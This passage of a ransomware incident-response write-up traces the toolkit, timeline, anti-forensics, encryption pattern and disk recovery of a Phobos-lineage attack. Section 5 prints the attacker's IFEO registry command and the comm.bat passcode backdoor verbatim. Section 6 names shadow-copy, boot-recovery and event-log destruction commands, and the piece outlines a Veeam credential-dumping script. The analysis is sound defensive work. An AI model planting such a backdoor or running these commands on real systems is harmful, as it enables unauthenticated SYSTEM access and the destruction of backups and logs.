+<td>netcat installer</td>
+</tr>
+<tr>
+<td><code>Hyper-V Detect.vbs</code></td>
+<td>853 B</td>
+<td>environment detection</td>
+</tr>
+<tr>
+<td><code>openrdp.bat</code></td>
+<td>303 B</td>
+<td>enables RDP on a target</td>
+</tr>
+<tr>
+<td><code>defoff.bat</code> / <code>turnoff.bat</code></td>
+<td>3.6 / 33 KB</td>
+<td>Defender kill, broad service kill</td>
+</tr>
+<tr>
+<td><code>Veeam-Get-Creds.ps1</code></td>
+<td>2,422 B</td>
+<td><strong>the specialisation — see below</strong></td>
+</tr>
+<tr>
+<td><code>Process Hacker 3.0\</code></td>
+<td>~14 MB</td>
+<td>including <code>kprocesshacker.sys</code>, <code>NSudoAPI.dll</code>, 30+ plugins</td>
+</tr>
+<tr>
+<td><code>Defender Control v2.1\</code></td>
+<td>~1.4 MB</td>
+<td>signed userland Defender killer, two variants</td>
+</tr>
+</tbody>
+</table>
+<p>Three observations.</p>
+<p><strong>The licence file was refreshed two weeks before the attack.</strong> The operator maintains a <em>licensed</em> working copy of a commercial network scanner between engagements. This kit is not disposable, and it is not a one-off download. It is a professional's tool bag.</p>
+<p><strong>The privilege-escalation stack is three-tier.</strong> <code>Defender Control</code> kills AV in userland. <code>NSudoAPI.dll</code> / <code>NSudoDM.dll</code> provide SYSTEM and TrustedInstaller elevation. <code>kprocesshacker.sys</code> is a signed kernel driver, and Process Hacker's driver is a well-known BYOVD candidate for terminating protected processes from kernel space. Plus <code>TerminatorPlugin.dll</code> and <code>TrustedInstallerPlugin.dll</code> in the plugin set. Whatever the AV situation had been, the kit had three independent answers to it.</p>
+<p><strong><code>wallfnd.vbs</code> and <code>fndr.vbs</code> are the pre-encryption sweep.</strong> A wallet-file finder in a ransomware kit is a reminder that these operators monetise opportunistically — crypto wallets, browser stores, documents worth exfiltrating — before the encryption event that ends their access.</p>
+<h4 id="the-one-bespoke-component">The one bespoke component</h4>
+<p><code>Veeam-Get-Creds.ps1</code> is 2,422 bytes of public PowerShell, dropped in unmodified. What it does:</p>
+<ol>
+<li>reads <code>HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication\</code> for <code>SqlServerName</code>, <code>SqlInstanceName</code>, <code>SqlDatabaseName</code>,</li>
+<li>opens the backup product's configuration database through <code>System.Data.SqlClient</code>,</li>
+<li>decrypts every stored credential — vCenter, ESXi root, Windows and Linux guest-OS accounts, SQL, backup-target hosts, cloud repositories,</li>
+<li>prints them in plaintext.</li>
+</ol>
+<p>It is published on GitHub for "demonstration and academic purposes". This operator dropped it into an otherwise commodity Phobos-lineage kit. <strong>That is the only target-specific component in 121 files</strong> — and it is the one that turns a compromised backup server into a compromised estate.</p>
+<p>We know it was <em>attempted</em>: the bitmap cache caught it open in PowerShell ISE at 13:44, with the script's own comment banner readable across several tiles and output lines at the bottom of the window showing a connection attempt to the config DB. Whether it reached the <code>catch { exit -1 }</code> branch is not readable from fragmented tiles. It does not really matter for planning — you have to assume it worked.</p>
+<h3 id="33-e-the-loader">3.3 <code>e\</code> — the loader</h3>
+<p>The smallest folder and the entry point.</p>
+<pre><code>e\
+├── scan.exe                             stager / loader
+├── Export_1.2.vbs                       wrapper
+├── dotnet-runtime-6.0.19-win-x64.exe    executed 13:58:39
+├── ip.txt                        158 B  the eleven hypervisor addresses
+├── log.txt                              execution log — contents gone
+└── start.bat                            ← does not appear in the MFT inventory
+</code></pre>
+<p>The <strong>.NET runtime installer being executed at 13:58</strong> is one of my favourite details in the whole case. It is not administrator maintenance. It is the operator discovering that a component of their kit needs a runtime that is not present, installing it, and <em>then</em> proceeding — seven hours before deploying the payload. That is dependency-checking. It is what "prep for main event" looks like in artefacts.</p>
+<p>And <code>start.bat</code>, which UserAssist says ran at 13:58:39, <strong>does not exist in the MFT-derived inventory of that folder</strong>. The kit had at least one component more than I could reconstruct. Every inventory in an incident report is a lower bound.</p>
+<hr/>
+<h2 id="4-the-seventeen-hour-shift">4. The seventeen-hour shift</h2>
+<p>All times UTC. Sources per line noted where they are interesting — <code>[USN]</code> change journal, <code>[MFT]</code> <code>$STANDARD_INFORMATION</code> timestamps, <code>[UA]</code> UserAssist, <code>[PCA]</code> Program Compatibility Assistant, <code>[AMC]</code> Amcache.</p>
+<pre><code>04:27:03  AzureArcSetup.exe + shortcut written                          [MFT]
+04:27:15  Windows Security UI opened — 14 seconds of focus              [UA]
+04:27:36  121-file toolkit drop begins                                  [MFT]
+04:28:29  …toolkit drop complete (53 seconds)                           [MFT]
+04:28:27  mimikatz.log written — mimikatz ran                           [MFT]
+04:29:33  IFEO hijack #1 planted: mpcmdrun.exe -&gt; systray.exe
+04:31:00  Defender Control run (installer failed)                       [PCA]
+04:31:06  cmd_pass.exe — 2 seconds of focus                             [UA]
+04:31:11  IFEO hijack #2 planted: narrator.exe -&gt; comm.bat
+04:31:13  netscan.exe — first of 43 focus events                        [UA]
+05:17     ESXi root credentials harvested from browser…                 [browser store]
+05:25     …eleven hosts, eight minutes
+06:16:16  CredentialsFileView64.exe, first run, 76 s of focus           [UA]
+07:07:23  CredentialsFileView64.exe again                               [PCA]
+11:47     WinFsp + SSHFS-Win MSIs installed
+13:04:27  failed logon on the administrator account                     [SAM]
+13:44:38  PowerShell ISE launched — 127 s of focus                      [UA]
+13:44:52  ISE file-open dialog (MRU: ps1, txt)                          [UA]
+13:58:13  .NET 6.0.19 runtime installer                                 [UA]
+13:58:39  e\start.bat — the file that isn't in the inventory            [UA]
+14:13:23  systray.exe inventory event — the IFEO redirect firing        [AMC]
+18:24     two backup restores of the main production VM (HotAdd)
+21:09:13  mount_drives.ps1 written                                      [USN]
+21:09:16  first sshfs mount registers (2.6 s later)                     [registry]
+21:09:17  net.exe — the net use loop                                    [AMC]
+21:09:26  eleventh mount up
+21:09:44  Process Hacker — 127 s of focus                               [UA]
+21:17:49  Defender Control, 2 runs                                      [UA]
+21:17:56  WScript.exe, 3 runs — first proof any staged .vbs executed    [UA]
+21:18:42  DL.exe #1 written to C:\ and timestomped                      [USN]
+21:19:06  121-file toolkit moved to the Recycle Bin                     [USN]
+21:20     datastore encryption pass begins across 11 mounts
+21:26     …datastore pass ends
+21:27:01  DL.exe #2 written to AppData\Local (3 ms write, timestomped)  [USN]
+21:27:01  marker file created in Users\Public (+3 ms)                   [USN]
+21:27:01  first local C: file encrypted (+201 ms)                       [USN]
+21:27:25  lod.bat written, timestomped to June 2023                     [USN]
+21:27:37  sshfs.exe crashes — stackdump written, mounts die             [USN]
+21:28:45  logdel1–7.bat created and self-deleted — 7 scripts in 76 ms   [USN]
+21:28:46  attrib.exe                                                    [AMC]
+21:28:49  timeout.exe — pacing                                          [AMC]
+21:28:53  vssadmin.exe + wmic.exe — shadow copy destruction             [AMC]
+21:28:54  bcdedit.exe — recovery disabled                               [AMC]
+21:29:33  137 Windows event channels cleared                            [USN]
+21:29:36  net1.exe — service stop                                       [AMC]
+21:30:31  outbound RDP (mstsc) — 4 runs, 1,748 s cumulative focus       [UA]
+21:38:12  DL.exe run count reaches 2                                    [UA]
+21:38:29  DL.exe second execution                                       [PCA]
+--- next day ---
+00:33:47  DL.exe #1 deleted — first cleanup pass                        [USN]
+05:56:58  final encryption burst on C:                                  [USN]
+06:09:08  operator RDP logon
+06:19:28  DL.exe #2 deleted — second cleanup pass                       [USN]
+06:19:39  RunOnce key written, then emptied (+11.7 s)                   [registry]
+</code></pre>
+<h3 id="41-two-encryptors-not-one">4.1 Two encryptors, not one</h3>
+<p>For a while, three observations looked contradictory: PCA logged the payload path as a bare <code>\DL.exe</code>; SRUM's application ID mapped it to a volume-root path on a different volume number than the one recorded for older artefacts; and a recovered Explorer screenshot showed <code>DL</code> (54 KB) sitting in a root-directory listing next to a <code>.ppk</code> file and <code>lod.bat</code>.</p>
+<p>A full USN sweep resolved it. There were <strong>two <code>DL.exe</code> files with two separate MFT records</strong>, dropped 8 minutes 19 seconds apart:</p>
+<pre><code>DL.exe #1 — MFT rec 5612 — C:\DL.exe
+  21:18:42.128  CREATE
+  21:18:42.128  EXTEND|CREATE
+  21:18:42.324  OVERWRITE|EXTEND|CREATE
+  21:18:42.326  BASIC                         ← SetFileTime() = timestomp
+  21:18:42.326  OVERWRITE|EXTEND|CREATE|CLOSE
+  (next day) 00:33:47.017  DELETE|CLOSE       ← first cleanup pass
+
+DL.exe #2 — MFT rec 3214 — C:\Users\&lt;admin&gt;\AppData\Local\DL.exe
+  21:27:01.126  CREATE
+  21:27:01.129  OVERWRITE|EXTEND|CREATE|BASIC|CLOSE   ← 3 ms write + timestomp
+  (next day) 06:19:28.092  DELETE|CLOSE       ← second cleanup pass
+</code></pre>
+<p>PCA was not truncating a path; it was accurately logging the root copy. The SRUM volume-number mismatch was real too — <code>HarddiskVolume</code> numbering had shifted between 2024 and 2026 as disks were attached and detached, which is a nice reminder that device paths in SRUM are not stable identifiers across time.</p>
+<p>The 11-minute gap between invocations is the window in which the operator noticed the crash. The two encryptor runs map onto the two ciphertext blobs.</p>
+<p>And the <strong>06:19:39 RunOnce write-then-empty, 11.7 seconds after the second binary was deleted</strong>, tells you the next-morning logon was a deliberate cleanup visit, not a check-in. Someone came back specifically to tidy up.</p>
+<h3 id="42-the-exfiltration-shaped-hole">4.2 The exfiltration-shaped hole</h3>
+<p>At <strong>18:24 — three hours before encryption, on a Sunday night</strong> — two backup restore operations landed on the box: <code>&lt;prod-vm&gt;_restored</code> and <code>&lt;prod-vm&gt;_clone</code>, both fresh copies of the organisation's main production VM, mounted via <strong>HotAdd</strong> (disks attached directly to the backup proxy so their contents can be browsed without booting the guest).</p>
+<p>Neither destination VM exists in vCenter today. The restore-agent logs — 30 of them — are all deleted, all with reused clusters. The MFT metadata establishes that the operation happened; the <em>contents</em> of what was browsed are unrecoverable.</p>
+<p>That is the operational signature of <strong>restore → browse → extract → clean up</strong>, executed against the crown-jewel VM immediately before the encryption event. No staging folder was found, no archive, no egress evidence on disk. Which brings me to the thing that is <em>still</em> unexamined and that I want to flag loudly for anyone doing this kind of work:</p>
+<p><strong>An Azure Storage Explorer profile was installed on the ransomed server.</strong> <code>%AppData%\Roaming\StorageExplorer\</code> with <code>Local Storage\leveldb</code>, <code>Session Storage</code>, <code>Network</code>, and Code Cache directories all present. That is a GUI blob-upload client. Its LevelDB state retains account names, subscription IDs, storage-account names and recent-connection history. Unlike an SMB copy, <strong>it leaves local state</strong>. It is the single most promising unexplored exfiltration lead in the entire engagement, and the scripts that touched that path in this investigation only enumerated it in the MFT — they never parsed its contents.</p>
+<p>If you take one operational habit from this post: when you cannot find the exfil channel, inventory the <em>cloud storage clients</em> installed on the box before you conclude it went out over SMB.</p>
+<hr/>
+<h2 id="5-persistence-two-ifeo-hijacks-with-two-different-jobs">5. Persistence: two IFEO hijacks with two different jobs</h2>
+<p>Image File Execution Options is a registry key where a <code>Debugger</code> value makes Windows launch a <strong>different</strong> program instead of the named one. Two were planted 98 seconds apart:</p>
+<table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Debugger</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>mpcmdrun.exe</code></td>
+<td><code>systray.exe</code> — genuine signed 32 KB Microsoft inbox stub</td>
+<td><strong>Neutering</strong></td>
+</tr>
+<tr>
+<td><code>narrator.exe</code></td>
+<td><code>comm.bat</code> — attacker script, 215 B, recovered</td>
+<td><strong>Backdoor</strong></td>
+</tr>
+</tbody>
+</table>
+<p>An earlier draft of my analysis treated both debugger targets as unrecovered attacker binaries, which was wrong and which mattered. Amcache resolved <code>systray.exe</code> to a genuine, signed, <code>IsOsComponent = 1</code> Microsoft binary of 32,768 bytes. So the first hijack is not payload delivery at all — it is <strong>Defender's own command-line interface being redirected to a harmless do-nothing OS component</strong>. Every scheduled scan, every signature update, every remediation task now silently no-ops. Nothing malicious executes, so there is nothing malicious to detect. It is cleaner tradecraft than dropping a fake <code>mpcmdrun.exe</code> would have been.</p>
+<p>The second hijack is the one I find genuinely elegant. Installer, 149 bytes, one command:</p>
+<pre><code class="language-bat">REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe" /f /v Debugger /t REG_SZ /d "%windir%\comm.bat"
+</code></pre>
+<p>Payload, 215 bytes:</p>
+<pre><code class="language-bat">MODE CON: COLS=45 LINES=1
+@Echo off
+color 02
+title
+cls
+:Password
+Set input=
+set /p input=
+if "%input%"=="&lt;code&gt;" goto YES
+if not "%input%"=="&lt;code&gt;" goto NO
+exit
+
+:YES
+Start cmd.exe
+Exit
+
+:NO?
+exit ?
+</code></pre>
+<p>A green terminal window <strong>one line tall and 45 columns wide</strong>, showing nothing but a cursor. Type the right code, get a fully privileged <code>cmd.exe</code>. Type anything else, it exits silently.</p>
+<p>The trigger is the point. <code>narrator.exe</code> is the Windows accessibility screen reader, and it is reachable <strong>from the RDP login screen</strong> — <code>Win+Ctrl+Enter</code>, or the Ease of Access button — <em>before authentication</em>. So the access path is: reach any RDP login screen on this host, invoke Narrator, receive a SYSTEM shell.</p>
+<p>The passcode gate is not security, it is camouflage: a legitimate admin who stumbles into it sees a tiny blank box that closes itself. (The specific code is a well-known neo-Nazi numeric string, commonly used as a signature by Russian-speaking underground actors. I am not reprinting it; treat any hardcoded four-digit gate in a batch file with the same suspicion.)</p>
+<p>364 bytes across two files. No service, no scheduled task, no Run key, no startup folder, nothing in any of the places persistence hunters look first. And it survives every credential rotation you perform, because it does not need a credential.</p>
+<hr/>
+<h2 id="6-anti-forensics-seven-scripts-in-76-milliseconds">6. Anti-forensics: seven scripts in 76 milliseconds</h2>
+<p>The wipe kit is seven batch files, <strong>all created and self-deleted inside the same second</strong> — 21:28:45.517 to 21:28:45.593. Each ends with <code>del "%~f0"</code>.</p>
+<table>
+<thead>
+<tr>
+<th>Script</th>
+<th>What it destroys</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>logdel1.bat</code></td>
+<td>RDP connection history — the <code>HKCU\...\Terminal Server Client</code> registry tree, <code>Default.rdp</code></td>
+</tr>
+<tr>
+<td><code>logdel2.bat</code></td>
+<td><strong>All</strong> Windows event logs via <code>WEVTUTIL CL</code>; then stops and <em>deletes</em> the <code>eventlog</code> and <code>wscsvc</code> services and disables Security Center</td>
+</tr>
+<tr>
+<td><code>logdel3.bat</code></td>
+<td>Prefetch, <code>%TEMP%</code>, cookies, recent files, IE cache, Recycle Bin, Jump Lists</td>
+</tr>
+<tr>
+<td><code>logdel4.bat</code></td>
+<td>A specific Jump List file, plus <code>*.tmp</code> drive-wide</td>
+</tr>
+<tr>
+<td><code>logdel5.bat</code></td>
+<td>Drive-wide <code>*.log</code>, <code>*.bak</code>, <code>*.chk</code>, <code>*.old</code>, <code>*._mp</code>, <code>*.gid</code></td>
+</tr>
+<tr>
+<td><code>logdel6.bat</code></td>
+<td><strong>VSS and backup destruction</strong> — <code>vssadmin Delete Shadows /All /Quiet</code>, <code>wmic SHADOWCOPY DELETE</code>, all <code>wbadmin</code> backups, <code>bcdedit /set {default} recoveryenabled No</code>, <code>bcdedit /set {default} bootstatuspolicy ignoreallfailures</code></td>
+</tr>
+<tr>
+<td><code>logdel7.bat</code></td>
+<td>Unknown — the only one whose content is permanently unrecoverable</td>
+</tr>
+</tbody>
+</table>
+<p>Six of seven were recovered <strong>because they were MFT-resident</strong>: a file small enough to fit in its MFT record stores its <code>$DATA</code> inline, so deleting it leaves the content in the record until that record is reused. <code>logdel7.bat</code> at 1,411 bytes was non-resident, its clusters were reallocated, and it is gone forever.</p>
+<p>Two things about this sequence deserve emphasis.</p>
+<p><strong><code>logdel2.bat</code> is why there is no event log evidence at all.</strong> It does not just clear channels — it deletes the Event Log service. 137 channels cleared at 21:29:33.</p>
+<p><strong>The shadow-copy destruction ran 104 seconds <em>after</em> encryption started.</strong> <code>DL.exe</code> began writing ciphertext at 21:27:01.327; <code>logdel6.bat</code> fired at 21:28:45. VSS destruction was not preparation, it was cleanup, executed concurrently with the encryption pass. By the time shadow copies died, the local disk was already being encrypted.</p>
+<p>And it did not matter, because recovery ended up depending on something no wiper can reach: backup GPT headers <em>inside the malware's own skip gaps</em>. The attacker's throughput optimisation preserved the exact metadata their wiper was trying to eliminate.</p>
+<h3 id="61-timestomping-and-the-artefact-that-defeats-it">6.1 Timestomping, and the artefact that defeats it</h3>
+<p>Every operator-dropped file carries a <code>BASIC</code> USN reason immediately after its write. <code>BASIC</code> means <code>NtSetInformationFile(FileBasicInformation)</code> — i.e. <code>SetFileTime()</code>. They forged <code>$STANDARD_INFORMATION</code> on each drop so Explorer would show the files as pre-existing.</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>True create (USN)</th>
+<th>Displayed in Explorer</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>lod.bat</code>, 8 KB</td>
+<td>21:27:25.336</td>
+<td><strong>2023-06-05 09:34</strong></td>
+</tr>
+<tr>
+<td><code>DL.exe</code> #1, 54 KB</td>
+<td>21:18:42.128</td>
+<td>earlier same day</td>
+</tr>
+<tr>
+<td><code>DL.exe</code> #2</td>
+<td>21:27:01.126</td>
+<td>earlier same day</td>
+</tr>
+</tbody>
+</table>
+<p>Two independent defeats:</p>
+<ol>
+<li><strong><code>$STANDARD_INFORMATION</code> is user-settable. <code>$FILE_NAME</code> is not.</strong> FN is kernel-maintained and only refreshed on rename, move or hardlink. Comparing SI against FN separates the claimed timeline from the actual one.</li>
+<li><strong>The USN <code>BASIC</code> reason survives the file.</strong> Even after the binary is deleted and its clusters reclaimed, the journal still records that someone called <code>SetFileTime()</code> on it, at what time, on which file reference.</li>
+</ol>
+<p>The same SI-vs-FN comparison did real work elsewhere in this case. A cryptominer directory on the volume showed:</p>
+<pre><code>                  SI.create                FN.create                delta
+xmrig.exe         2024-02-03 13:44:59.877  2024-02-03 14:00:54.851  +955 s
+config.json       2024-02-03 13:44:59.655  2024-02-03 14:00:54.788  +955 s
+WinRing0x64.sys   2024-02-03 13:44:59.846  2024-02-03 14:00:54.851  +955 s
+</code></pre>
+<p>A 16-minute SI/FN gap with fresh FN timestamps means these files were <strong>copied onto this volume</strong> from somewhere else, not extracted here: a copy tool restored the source's SI timestamps while the kernel stamped new FN values. Meanwhile the binary's own mtime matched its PE compile timestamp <em>to the second</em> — that is the vendor's build time, preserved through the copy. Three distinct dates in one folder: when the software was built, when it was created at its original location, and when it arrived here.</p>
+<hr/>
+<h2 id="7-the-payload-85-mib-of-ciphertext-against-2187-tb">7. The payload: 85 MiB of ciphertext against 21.87 TB</h2>
+<p>The malware renames its victims <code>*.vmdk.doglock</code>. It does not encrypt virtual disks. It encrypts <strong>2.5 MiB of each virtual disk</strong>.</p>
+<table>
+<thead>
+<tr>
+<th>Measurement</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ciphertext per image</td>
+<td><strong>2.5 MiB</strong> — 1.25 MiB at the head, 1.25 MiB at the tail</td>
+</tr>
+<tr>
+<td>Pattern</td>
+<td><strong>8 KiB encrypted / 8 KiB skipped</strong>, 160 iterations at each end</td>
+</tr>
+<tr>
+<td>Region covered</td>
+<td>first 2,621,440 bytes and last 2,621,440 bytes</td>
+</tr>
+<tr>
+<td>Appended trailer</td>
+<td>944 or 992 bytes</td>
+</tr>
+<tr>
+<td>Total ciphertext, whole estate</td>
+<td><strong>≈ 85 MiB</strong></td>
+</tr>
+<tr>
+<td>Data held hostage</td>
+<td><strong>21.87 TB</strong></td>
+</tr>
+<tr>
+<td>Fraction of bytes destroyed</td>
+<td><strong>0.0004 %</strong></td>
+</tr>
+<tr>
+<td>Disks recoverable without the key</td>
+<td><strong>33 of 34 (97 %)</strong></td>
+</tr>
+</tbody>
+</table>
+<pre><code>########........########........########........########........########........
+</code></pre>
+<p>Eight kilobytes on, eight off. Same at the tail:</p>
+<pre><code>########........########........########........########.......o########.......o
+                                                       ↑ backup GPT header lives here
+</code></pre>
+<p>The pattern is <strong>file-offset aligned, not filesystem aligned</strong>. It has no idea what it is hitting. On a 4.6 TB disk it does exactly as much work as on a 25 GiB one. Intermittent encryption is a throughput decision: lock the whole datastore before anyone notices, rather than encrypt one VM properly.</p>
+<h3 id="71-what-25-mib-at-each-end-actually-destroys">7.1 What 2.5 MiB at each end actually destroys</h3>
+<table>
+<thead>
+<tr>
+<th>Structure</th>
+<th>Location</th>
+<th>Fate</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MBR / protective MBR</td>
+<td>LBA 0</td>
+<td><strong>destroyed</strong>, all 34 images</td>
+</tr>
+<tr>
+<td>Primary GPT header + entry array</td>
+<td>LBA 1–33</td>
+<td><strong>destroyed</strong></td>
+</tr>
+<tr>
+<td>First partition's NTFS boot sector</td>
+<td>LBA 2048</td>
+<td><strong>destroyed</strong></td>
+</tr>
+<tr>
+<td>ext4 primary superblock</td>
+<td>partition + 1024 B</td>
+<td><strong>destroyed</strong> where the partition starts inside 2.5 MiB</td>
+</tr>
+<tr>
+<td>LVM PV label + metadata area</td>
+<td>partition start</td>
+<td><strong>destroyed</strong>, same condition</td>
+</tr>
+<tr>
+<td>Backup GPT entry array</td>
+<td>last 33–1 sectors</td>
+<td>partially destroyed — entries 5–68 overwritten</td>
+</tr>
+</tbody>
+</table>
+<p>Enough to make every disk unbootable and unmountable. Which is the entire point: the malware is not destroying data, it is destroying the <em>addressing</em> of data, because that is 0.0004 % of the work for approximately the same leverage.</p>
+<h3 id="72-why-97-came-back-anyway">7.2 Why 97 % came back anyway</h3>
+<p>Four redundancy mechanisms sit outside the blast radius, and a fifth quirk helps:</p>
+<ol>
+<li><strong>The backup GPT header survives — in every single image.</strong> The pattern's final skip gap is 8 KiB wide; the GPT header occupies the disk's last 512 bytes. It lands in a gap every time. All 13 GPT-partitioned disks had a backup GPT with <strong>valid CRC32</strong>.</li>
+<li><strong>ext4 writes backup superblocks every 32,768 blocks.</strong> With 4 KiB blocks the first one is 128 MiB in — fifty times beyond the malware's reach. Mount directly: <code>mount -t ext4 -o ro,norecovery,sb=131072</code>.</li>
+<li><strong>NTFS keeps a backup boot sector at the end of every volume.</strong> Every NTFS guest came back this way. The backup VBR also hands you the volume's true geometry: start offset, cluster size, <code>$MFT</code> location.</li>
+<li><strong>Large partitions start beyond 2.5 MiB</strong> and are entirely untouched, primary superblock included.</li>
+<li><strong><code>$MFT</code> is not at the start of an NTFS volume.</strong> Windows places it around cluster 786,432 — roughly 3 GB in. The master file table was never at risk.</li>
+</ol>
+<p>The recovery procedure, in outline: rebuild the protective MBR and primary GPT from the backup GPT at the tail; for each partition, locate the filesystem by signature; for NTFS, copy the backup VBR from the volume's last sector to its first; for ext4, mount with an explicit backup superblock; for LVM, reconstruct the PV label from the metadata area copies. Then image the guest filesystem out to clean storage — do not attempt to run the recovered disk in place.</p>
+<h3 id="73-the-trailer">7.3 The trailer</h3>
+<pre><code>┌──────────────┬────────────────────────────────────┬──────────────┐
+│ 128 bytes    │ 768 bytes                          │ 48 or 96 B   │
+│ binary,      │ ASCII hex text: 16 lines of        │ binary,      │
+│ per-image    │ "XX XX .. XX\n"  → 256 bytes       │ per-image    │
+└──────────────┴────────────────────────────────────┴──────────────┘
+                total: 944 or 992 bytes
+</code></pre>
+<p>The middle 768 bytes are <strong>256 bytes of binary written as human-readable hex</strong> — 2048 bits, consistent by length with an RSA-2048-wrapped per-file symmetric key. The leading 128 bytes vary per image (key-derivation material). The trailing 48 or 96 bytes are a fixed campaign marker.</p>
+<p>Writing the wrapped key as ASCII hex is an odd choice and a gift to responders: <code>strings</code> on the last 4 KiB of any affected file yields the campaign identifier and lets you group images by encryption run in seconds. That is how the two blobs above were found.</p>
+<p>Alongside the ciphertext, the encryptor drops a <strong>zero-byte file whose name is the victim identifier</strong> — 64 hex characters, SHA-256-length, unique per campaign — into <code>C:\Users\Public\</code>, three milliseconds after the encryptor process closed and <em>before</em> any file was renamed. The same value is embedded in every ransom note. It is the operator's out-of-band victim key.</p>
+<h3 id="74-the-second-recovery-frontier-every-small-file-is-half-plaintext">7.4 The second recovery frontier: every small file is half plaintext</h3>
+<p>The 2.5 MiB head/tail model describes a VMDK-sized target. Ordinary Windows files — registry hives, credential stores, config files, logs, browser databases — are almost always <strong>under 5 MiB</strong>, so the head and tail regions <em>overlap</em> and the whole file falls inside the pattern:</p>
+<table>
+<thead>
+<tr>
+<th>File size</th>
+<th>Behaviour</th>
+<th>Plaintext recoverable</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>≤ 8 KiB</td>
+<td>fully encrypted, one block</td>
+<td>0 %</td>
+</tr>
+<tr>
+<td>8 KiB – ~5 MiB</td>
+<td>8 KiB on / 8 KiB off across the <strong>whole file</strong></td>
+<td><strong>~50 %</strong>, every odd block</td>
+</tr>
+<tr>
+<td>&gt; 5 MiB</td>
+<td>2.5 MiB damaged at each end, middle intact</td>
+<td>99 %+</td>
+</tr>
+</tbody>
+</table>
+<p>This changes what "encrypted" means for thousands of files in an estate. Half the bytes of every registry hive, credential store and log the ransomware touched are on disk in the clear. Whether that is <em>useful</em> depends on whether the specific bytes you need landed on an odd 8 KiB block — but for structured formats it very often is, because those formats are page-oriented and a single surviving page is parsable in isolation. SQLite B-tree leaf pages. ESE database pages. Bencode records. XML and JSON fragments.</p>
+<p>Three concrete results from this engagement:</p>
+<table>
+<thead>
+<tr>
+<th>Encrypted file</th>
+<th>Size</th>
+<th>Surviving plaintext</th>
+<th>Outcome</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Firefox <code>key4.db</code> (master key store)</td>
+<td>295,856 B</td>
+<td>147,456 B on 18 odd blocks</td>
+<td><strong>40 of 40 credentials decrypted</strong> — the <code>metaData</code> globalSalt row and the <code>nssPrivate</code> A11 blob both landed on intact pages</td>
+</tr>
+<tr>
+<td>uTorrent <code>resume.dat</code></td>
+<td>35,328 B</td>
+<td>16,384 B on 2 blocks</td>
+<td>full torrent metadata, source URLs, trackers, 43 GiB download history, completion dates</td>
+</tr>
+<tr>
+<td>uTorrent <code>settings.dat</code></td>
+<td>21,888 B</td>
+<td>8,192 B on 1 block</td>
+<td>client config, geoip locale, 96 lifetime launches</td>
+</tr>
+</tbody>
+</table>
+<p>The browser's encrypted master-key database was recovered <em>from its own ciphertext</em> and used to decrypt exactly the credential set the operator had stolen that morning. I enjoy that symmetry more than is professional.</p>
+<p>Generalised method: strip the trailer, take every odd 8 KiB block starting at offset 8192, and parse the surviving fragments as whatever the format was. For SQLite this means walking pages independently of the file header. For ESE hives, the same. Do not expect a valid file — expect valid <em>records</em>.</p>
+<p><strong>The "97 % of virtual disks recovered" figure therefore understates the recoverable data.</strong> Thousands of individual guest files yield partial-to-complete content by the same arithmetic, with no key involved.</p>
+<h3 id="75-measuring-a-cipher-you-do-not-have">7.5 Measuring a cipher you do not have</h3>
+<p>The encryptor binary was never recovered — deleted onto a thin-provisioned, TRIM-backed volume, which zeroes reclaimed blocks within days. So the cipher was characterised <em>behaviourally</em>, using a known-plaintext corpus that turned up by accident.</p>
+<p>The acquisition store held a 126 MB VMware guest swap file, encrypted. It proved to be <strong>entirely zero-filled before encryption</strong> — all 320 skipped blocks and the whole 126,877,696-byte intact middle contain not one non-zero byte. The guest never paged. As a memory artefact it is worthless. As a known-plaintext corpus it is 320 encrypted 8 KiB blocks whose plaintext is provably all zeros.</p>
+<table>
+<thead>
+<tr>
+<th>Test</th>
+<th>Result</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>320 blocks of <code>E(0×8192)</code> within one file</td>
+<td><strong>320 distinct ciphertexts</strong>, zero repeats</td>
+</tr>
+<tr>
+<td>Byte histogram, block 0</td>
+<td>all 256 values present, max frequency 54 — flat</td>
+</tr>
+<tr>
+<td>Internal period, 16–4096 B</td>
+<td>none detected</td>
+</tr>
+<tr>
+<td><code>block₀ ⊕ block₁</code></td>
+<td>8,164 / 8,192 bytes non-zero</td>
+</tr>
+<tr>
+<td><code>block₀ ⊕ block₃₁₉</code></td>
+<td>8,151 / 8,192 bytes non-zero</td>
+</tr>
+<tr>
+<td>Cross-file, swap vs six other samples</td>
+<td><strong>0 shared ciphertext blocks</strong></td>
+</tr>
+</tbody>
+</table>
+<p>Identical plaintext at 320 different offsets producing 320 different ciphertexts means the keystream is a function of <strong>file position and of something per-file</strong> — key or IV seed. Flat distribution, no repeats, no internal period, no cross-file reuse. That is the signature of <strong>AES in CTR mode, or CBC with an offset-derived IV</strong>.</p>
+<p>Conclusion: <strong>no keystream reuse, no key-recovery shortcut.</strong> Recovery here depended entirely on the intermittent-encryption geometry and never on a cryptographic weakness. If this family ever ships a variant that encrypts contiguously, none of the above works.</p>
+<hr/>
+<h2 id="8-two-claims-that-did-not-survive-the-evidence">8. Two claims that did not survive the evidence</h2>
+<p>The retractions are the section I would want to read in someone else's writeup, so here are mine.</p>
+<h3 id="81-rsa-2048-via-statically-linked-mbedtls-no-static-aes">8.1 "RSA-2048 via statically-linked mbedTLS, no static AES"</h3>
+<p>An earlier draft asserted both. Neither came from the binary that ran on this host — that binary does not exist any more. They came from a static-analysis pass over <strong>five same-family samples downloaded from a public malware repository</strong>, all 54,272–55,296 bytes, all sharing one imphash and a byte-identical 12,680-byte code region from the entry point. That analysis reported mbedTLS strings, an mbedTLS bignum small-primes table, SHA-256 round constants, and no AES S-box in any sample.</p>
+<p>Why the retraction stands: those samples and the scripts that analysed them lived in transient scratch and <strong>were not preserved in the evidence store</strong>. There is no reproducible artefact backing either claim. And they are not our build in any case — they are same-family siblings whose per-campaign key material lives in exactly the regions that vary.</p>
